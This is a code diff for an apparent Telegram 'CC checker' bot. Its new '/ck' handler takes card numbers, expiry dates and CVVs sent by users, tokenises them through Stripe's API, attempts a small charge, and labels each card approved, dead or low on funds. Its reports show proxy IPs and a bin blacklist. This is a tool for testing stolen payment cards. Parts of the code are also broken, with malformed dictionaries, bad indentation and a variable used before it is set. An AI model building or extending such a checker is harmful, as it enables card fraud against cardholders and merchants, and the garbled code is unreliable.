@@ -127,14 +127,14 @@ OWNER⇢ <a href="tg://user?id={OWNER}">LINK</a>
     await message.reply(INFO)
 
 
-@dp.message_handler(commands=['ck'], commands_prefix=PREFIX)
+@dp.message_handler(commands=['cv'], commands_prefix=PREFIX)
 async def ch(message: types.Message):
     await message.answer_chat_action('typing')
     tic = time.perf_counter()
     ID = message.from_user.id
     FIRST = message.from_user.first_name
     try:
-        await dp.throttle('ck', rate=ANTISPAM)
+        await dp.throttle('cv', rate=ANTISPAM)
     except Throttled:
         await message.reply('<b>Too many requests!</b>\n'
                             f'Blocked For {ANTISPAM} seconds')
@@ -142,10 +142,10 @@ async def ch(message: types.Message):
         if message.reply_to_message:
             cc = message.reply_to_message.text
         else:
-            cc = message.text[len('/ck '):]
+            cc = message.text[len('/cv '):]
 
         if len(cc) == 0:
-            return await message.reply("<b>No Card to ck</b>")
+            return await message.reply("<b>No Card to cv</b>")
 
         x = re.findall(r'\d+', cc)
         ccn = x[0]
@@ -249,6 +249,179 @@ async def ch(message: types.Message):
             return await message.reply(f'''
 ✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ #ApprovedCCN
+<b>MSG</b>➟ {ri.text}
+<b>PROXY-IP</b> <code>{b}</code>
+<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>CKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+<b>OWNER</b>: {await is_owner(ID)}
+<b>BOT</b>: @{BOT_USERNAME}''')
+
+        if 'declined' in ri.text:
+            return await message.reply(f'''
+❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+<b>STATUS</b>➟ Declined
+<b>MSG</b>➟ {ri.text}
+<b>PROXY-IP</b> <code>{b}</code>
+<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>CKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+<b>OWNER</b>: {await is_owner(ID)}
+<b>BOT</b>: @{BOT_USERNAME}''')
+
+        await message.reply(f'''
+❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+<b>STATUS</b>➟ DEAD
+<b>MSG</b>➟ {ri.text}
+<b>PROXY-IP</b> <code>{b}</code>
+<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+<b>OWNER</b>: {await is_owner(ID)}
+<b>BOT</b>: @{BOT_USERNAME}''')
+
+@dp.message_handler(commands=['ck'], commands_prefix=PREFIX)
+async def ch(message: types.Message):
+    await message.answer_chat_action('typing')
+    tic = time.perf_counter()
+    ID = message.from_user.id
+    FIRST = message.from_user.first_name
+    try:
+        await dp.throttle('ck', rate=ANTISPAM)
+    except Throttled:
+        await message.reply('<b>Too many requests!</b>\n'
+                            f'Blocked For {ANTISPAM} seconds')
+    else:
+        if message.reply_to_message:
+            cc = message.reply_to_message.text
+        else:
+            cc = message.text[len('/ck '):]
+
+        if len(cc) == 0:
+            return await message.reply("<b>No Card to ck</b>")
+
+        x = re.findall(r'\d+', cc)
+        ccn = x[0]
+        mm = x[1]
+        yy = x[2]
+        cvv = x[3]
+        if mm.startswith('2'):
+            mm, yy = yy, mm
+        if len(mm) >= 3:
+            mm, yy, cvv = yy, cvv, mm
+        if len(ccn) < 15 or len(ccn) > 16:
+            return await message.reply('<b>Failed to parse Card</b>\n'
+                                       '<b>Reason: Invalid Format!</b>')   
+        BIN = ccn[:6]
+        if BIN in BLACKLISTED:
+            return await message.reply('<b>BLACKLISTED BIN</b>')
+       load = {
+            "card[number]": ccn,
+            "card[exp_month]": mm,
+            "card[exp_year]": yy,
+            "card[cvc]": cvv
+        }
+
+        header = {
+            "accept": "application/json",
+            "content-type": "application/x-www-form-urlencoded",
+            "user-agent": UA,
+            "origin": "https://js.stripe.com",
+            "referer": "https://js.stripe.com/",
+            "accept-language": "en-US,en;q=0.9",
+            "Authorization: Bearer <SK>" 
+
+        }
+
+        rx = session.post('https://api.stripe.com/v1/tokens',
+                          data=load, headers=header)
+        token = rx.json()['id']
+        LastF = f'************{ccn[-4:]}'
+
+        if 'Request rate limit exceeded.' in ri.text:
+            return await message.reply(f'''
+❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+<b>STATUS</b>➟ Request rate limit exceeded.
+<b>MSG</b>➟ {ri.text}
+<b>PROXY-IP</b> <code>{b}</code>
+<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>CKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+<b>OWNER</b>: {await is_owner(ID)}
+<b>BOT</b>: @{BOT_USERNAME}''')
+
+        if 'API Key provided' in ri.text:
+            return await message.reply(f'''
+❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+<b>STATUS</b>➟ API Key provided
+<b>MSG</b>➟ {ri.text}
+<b>PROXY-IP</b> <code>{b}</code>
+<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>CKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+<b>OWNER</b>: {await is_owner(ID)}
+<b>BOT</b>: @{BOT_USERNAME}''')
+        else:
+        payload = {
+            "amount": 80",
+            "currency": "USD",            
+            "source": token           
+        }
+
+        head = {
+            "accept": "*/*",
+            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "Authorization: Bearer <SK>",
+            "user-agent": UA,
+            "accept-language": "en-US,en;q=0.9"
+        }
+
+        ri = session.post('https://api.stripe.com/v1/charges', data=payload,
+                          headers=head)
+        toc = time.perf_counter()
+
+        if 'Payment complete' in ri.text:
+            return await message.reply(f'''
+✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+<b>STATUS</b>➟ Charge 0.8$✅
+<b>MSG</b>➟ {ri.text}
+<b>PROXY-IP</b> <code>{b}</code>
+<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>CKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+<b>OWNER</b>: {await is_owner(ID)}
+<b>BOT</b>: @{BOT_USERNAME}''')
+
+        if 'incorrect_cvc' in ri.text:
+            return await message.reply(f'''
+✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+<b>STATUS</b>➟ #ApprovedCCN
+<b>MSG</b>➟ {ri.text}
+<b>PROXY-IP</b> <code>{b}</code>
+<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>CKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+<b>OWNER</b>: {await is_owner(ID)}
+<b>BOT</b>: @{BOT_USERNAME}''')
+        if 'Request rate limit exceeded.' in ri.text:
+            return await message.reply(f'''
+❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+<b>STATUS</b>➟ Request rate limit exceeded.
+<b>MSG</b>➟ {ri.text}
+<b>PROXY-IP</b> <code>{b}</code>
+<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>CKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+<b>OWNER</b>: {await is_owner(ID)}
+<b>BOT</b>: @{BOT_USERNAME}''')
+
+        if 'API Key provided' in ri.text:
+            return await message.reply(f'''
+❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+<b>STATUS</b>➟ API Key provided
+<b>MSG</b>➟ {ri.text}
+<b>PROXY-IP</b> <code>{b}</code>
+<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>CKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+<b>OWNER</b>: {await is_owner(ID)}
+<b>BOT</b>: @{BOT_USERNAME}''')
+
+        if 'insufficient_funds' in ri.text:
+            return await message.reply(f'''
+❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+<b>STATUS</b>➟ Insufficient_funds
 <b>MSG</b>➟ {ri.text}
 <b>PROXY-IP</b> <code>{b}</code>
 <b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
